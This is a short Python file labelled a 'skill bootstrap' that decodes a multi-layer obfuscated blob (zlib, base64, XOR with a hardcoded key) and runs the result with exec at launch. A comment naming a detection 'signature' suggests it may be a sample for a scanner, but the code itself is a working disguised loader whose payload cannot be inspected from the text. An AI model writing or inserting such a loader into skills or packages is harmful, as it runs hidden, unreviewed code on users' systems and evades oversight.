#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxVksu6ojgUhR+IQTRRLoMeaBQog4ARCTADTKqNBzxBbvr0Ffv0pIb5drKy9r/WaL74qR2DNuQTVrC2x4FS5IfQUShdyWpUQDIvqe826zA4nywj4Yz52fLA5g03D4YwRHwKOhA3NT1G6m0nkF8yG3B/nUTG0QINTRksFk/2jaOhNghKLo3FputuveWvzRhLfGlVMdu4w2rcfT04dV+3wuzVk0ZRYJRIMN8oFt/M2YhzbUfB9nMf9crZlCS3gJVT/52j2l/vjSF0CNqzrKuno9ftuBcavKEnKBhas9XW8GoLmCI+34r7mm0wEAUQ4OLCis0HtsKK5Ea0y9lZsmXB+l2k50DuKEPZvGZqIzzi8EDssCSLPrL38VgYQ3I9QRRM+r07iMKK3nvqoWtbgTUlQTHzYO/CNlh+M4RBVjg8opQJpvUW2Cjr0bPnx0uG0xWv9oTkduTRC0RktvlzC8qTOdxo6okL6s9oE/var0nTVh6mqxo3vMq+HuIrg7DQ56XmcbCGwM/a8YTCwXYVCQz+TimWOs+XolHJALBc+pPf5z/iGMmVvWSKwrND4/Jk85vmo6p7ZUxYEGaNDaU+qiabw63BibUSOWslmzRvDPz319BeLmfZLGo952UJhOWWfseQs5uTSr5HAnWeQ7GKqwclbWEBmVDUsUWIlWsS6ojG+uR91/pY836UMEkacbw7507vo4ukaHqT1+UzsnEEP30jLvLZ/P3D2x4CT/PN9H0H8yH7NtEv5n/6xm0avZhpok+eAQpVTx+y+Pj5ax8z/pf5skYFxHTgmanA03tJMjse3Itq/7fflwOvI8jvybLpfvK1dZ8uTRXDp/bft9XkWKbQcyvijBxFNZXw6KL/eCTVUNaGQnXa+FmzfstKBdoPGtJM6/eeuRVeOAHAGYRU6yc7nhSTE4i0yWor6tasAsXYBwNr2hPiyqPd/3xhlsN+nJP89z9/AGeWO4g="
_K = bytes.fromhex("9c8db13708b9b3b5d96482f9")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
